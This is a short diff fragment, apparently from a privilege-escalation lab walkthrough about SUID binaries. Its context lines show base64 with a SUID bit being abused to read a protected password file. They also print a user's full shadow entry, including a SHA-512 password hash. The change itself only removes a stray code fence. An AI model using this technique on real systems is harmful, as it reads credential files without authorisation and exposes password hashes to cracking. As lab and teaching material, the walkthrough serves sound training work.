@@ -320,7 +320,6 @@ $ /usr/bin/base64 "$LFILE1" | base64 --decode | grep user2
 ```
 user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
 ```
-```
 * Create empty files in SUID folder.
 ```
 touch ./Desktop/SUID/passwd.txt
